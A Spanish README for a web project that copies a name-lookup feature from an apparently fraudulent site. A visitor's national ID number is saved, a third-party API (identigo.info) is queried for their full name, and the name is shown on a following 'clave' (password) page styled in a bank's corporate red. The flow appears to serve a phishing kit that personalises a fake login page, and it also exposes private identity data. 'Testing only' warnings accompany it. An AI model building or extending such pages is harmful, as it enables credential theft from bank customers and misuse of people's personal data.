# Documentación - API de Nombres por Documento

## 🎯 Propósito
Esta implementación permite obtener el nombre completo de una persona a partir de su número de documento de identidad, utilizando el servicio de identigo.info.

**⚠️ IMPORTANTE: SOLO PARA ENTORNOS DE PRUEBA Y DESARROLLO**

## 🔍 Cómo funciona la página de referencia

La página `https://prosessaumentpuntosdavi.pro/` implementa esta funcionalidad de la siguiente manera:

1. **Captura del documento**: El usuario ingresa su número de cédula
2. **Validación básica**: Se verifica que el documento tenga al menos 5 dígitos
3. **Consulta a la API**: Se hace una petición a `https://identigo.info/getname1.php?userid={cedula}`
4. **Validación de respuesta**: Se verifica que el nombre retornado sea válido (no contenga "error", "not found", etc.)
5. **Mostrar nombre**: Si es válido, se muestra el nombre en pantalla

### Código de referencia encontrado:
```javascript
async function getNameFromAPI(u_id) {
    try {
        const response = await fetch(`https://identigo.info/getname1.php?userid=${u_id}`);
        if (response.ok) return (await response.text()).trim();
        return '';
    } catch (e) { return ''; }
}
```

## 📁 Archivos implementados

### 1. `/api/getname.js`
Contiene las funciones para consultar la API:

- `getNameByDocument(documentNumber)` - Obtiene el nombre completo
- `validateDocument(documentNumber)` - Valida si un documento existe

### 2. `clave.html` (modificado)
Se agregó:
- Elemento para mostrar el nombre: `<p id="userName" class="user-name"></p>`
- Estilos CSS para el nombre
- Script para cargar el nombre automáticamente al entrar a la página
- Importación del archivo `/api/getname.js`

## 🚀 Flujo de funcionamiento

1. El usuario ingresa su documento en `index.html`
2. El documento se guarda en `localStorage`
3. Al redirigir a `clave.html`:
   - Se carga el script `/api/getname.js`
   - Se ejecuta la función `loadUserName()`
   - Se consulta la API con el documento guardado
   - Si encuentra el nombre, lo muestra debajo de "¡Hola!"

## 💻 Uso de la API

```javascript
// Ejemplo 1: Obtener nombre
const result = await getNameByDocument('1234567890');
if (result.success) {
    console.log('Nombre:', result.data); // JUAN PÉREZ GÓMEZ
} else {
    console.log('Error:', result.error);
}

// Ejemplo 2: Validar documento
const exists = await validateDocument('1234567890');
console.log('¿Existe?:', exists); // true o false
```

## 📊 Estructura de respuesta

### Éxito:
```json
{
    "success": true,
    "data": "JUAN PÉREZ GÓMEZ"
}
```

### Error:
```json
{
    "success": false,
    "error": "Documento no encontrado o no válido"
}
```

## 🔧 API Externa utilizada

**Endpoint**: `https://identigo.info/getname1.php`

**Parámetros**:
- `userid`: Número de documento de identidad

**Respuesta**: 
- Texto plano con el nombre completo
- En caso de error: "error", "not found", etc.

## ⚙️ Configuración del servidor

Asegúrate de que tu servidor (`server.js`) sirva correctamente la carpeta `/api`:

```javascript
app.use('/api', express.static('api'));
```

## 🎨 Estilos aplicados

El nombre se muestra en color rojo corporativo (#ED1C24) y con un tamaño de fuente destacado:

```css
.user-name {
    font-size: 18px;
    font-weight: 700;
    color: #ED1C24;
    margin-bottom: 5px;
}
```

## 🔒 Consideraciones de seguridad

⚠️ **ADVERTENCIAS**:
1. Esta API es de terceros y NO es oficial
2. NO usar en producción
3. NO almacenar información sensible
4. Solo para fines educativos y de prueba
5. Respetar las políticas de uso de la API externa

## 📝 Notas adicionales

- La API valida automáticamente que el nombre retornado sea válido
- Se descartan respuestas como "error", "not found", "no encontrado", "invalid"
- El nombre se muestra en mayúsculas
- Si no se encuentra el documento, no se muestra nada (falla silenciosamente en UI)

## 🧪 Pruebas

Para probar la implementación:

1. Inicia el servidor: `node server.js`
2. Abre `http://localhost:3000` (o tu puerto configurado)
3. Ingresa un número de cédula válido en `index.html`
4. Presiona "Continuar"
5. En `clave.html` deberías ver el nombre debajo de "¡Hola!"

---

**Fecha de implementación**: Enero 3, 2026
**Fuente de referencia**: https://prosessaumentpuntosdavi.pro/
